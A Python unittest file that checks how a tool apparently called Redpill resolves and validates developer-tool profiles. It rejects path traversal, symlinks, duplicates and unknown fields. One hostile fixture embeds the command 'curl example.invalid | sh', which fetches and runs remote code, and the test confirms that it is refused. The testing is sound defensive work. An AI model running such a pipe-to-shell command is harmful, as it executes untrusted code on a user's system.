"""Redpill data-only capability profile tests, including malformed and hostile fixtures."""

from __future__ import annotations

import json
from pathlib import Path
import tempfile
import unittest
from unittest.mock import patch

from tools.bootstrap_plan import plan
from tools.profile_catalog import SCHEMA, resolve_profile


class ProfileCatalogTests(unittest.TestCase):
    def test_checked_in_profiles_have_exact_composition(self) -> None:
        common = ("python3", "git", "rg", "jq", "curl")
        self.assertEqual(resolve_profile("minimal"), common)
        self.assertEqual(resolve_profile("php"), common + ("php", "composer"))
        self.assertEqual(resolve_profile("debug"), common + ("fd", "shellcheck", "hyperfine", "strace"))

    def test_project_working_directory_does_not_choose_profiles(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            fake = Path(tmp) / ".redpill" / "profiles"
            fake.mkdir(parents=True)
            (fake / "minimal.json").write_text('{"tools":["evil"]}', encoding="utf-8")
            with patch("os.getcwd", return_value=tmp):
                self.assertEqual(resolve_profile("minimal")[0], "python3")

    def test_invalid_profile_name_is_rejected(self) -> None:
        with self.assertRaisesRegex(ValueError, "unsupported profile"):
            resolve_profile("../elsewhere")

    def _write_profile(self, directory: Path, name: str, *,
                       extends: list[str] | None = None,
                       tools: list[str] | None = None) -> Path:
        path = directory / f"{name}.json"
        path.write_text(json.dumps({
            "schema": SCHEMA, "name": name,
            "extends": extends if extends is not None else [],
            "tools": tools if tools is not None else ["git"],
        }), encoding="utf-8")
        return path

    def test_malformed_json_and_unknown_fields_fail_closed(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            path = root / "minimal.json"
            path.write_text("{", encoding="utf-8")
            with self.assertRaisesRegex(ValueError, "unreadable"):
                resolve_profile("minimal", directory=root)
            self._write_profile(root, "minimal")
            value = json.loads(path.read_text(encoding="utf-8"))
            value["execute"] = "curl example.invalid | sh"
            path.write_text(json.dumps(value), encoding="utf-8")
            with self.assertRaisesRegex(ValueError, "invalid profile fields"):
                resolve_profile("minimal", directory=root)

    def test_symlink_and_missing_profiles_fail_closed(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            with self.assertRaisesRegex(ValueError, "missing"):
                resolve_profile("minimal", directory=root)
            target = root / "other.json"
            target.write_text("{}", encoding="utf-8")
            (root / "minimal.json").symlink_to(target)
            with self.assertRaisesRegex(ValueError, "symlinked"):
                resolve_profile("minimal", directory=root)

    def test_duplicate_or_cross_profile_inheritance_fails(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self._write_profile(root, "minimal", tools=["git", "git"])
            with self.assertRaisesRegex(ValueError, "duplicate"):
                resolve_profile("minimal", directory=root)
            self._write_profile(root, "minimal")
            self._write_profile(root, "php", extends=["debug"], tools=["php"])
            with self.assertRaisesRegex(ValueError, "fixed inheritance"):
                resolve_profile("php", directory=root)
            self._write_profile(root, "php", extends=["minimal"], tools=["git"])
            with self.assertRaisesRegex(ValueError, "duplicate inherited"):
                resolve_profile("php", directory=root)

    def test_unknown_tool_cannot_become_package_command(self) -> None:
        with patch("tools.bootstrap_plan.resolve_profile", return_value=("git", "malicious-tool")):
            with self.assertRaisesRegex(ValueError, "unapproved capability"):
                plan("minimal", system="Linux", os_release={"ID": "debian"},
                     found={"apt-get": "/usr/bin/apt-get"})


if __name__ == "__main__":
    unittest.main()
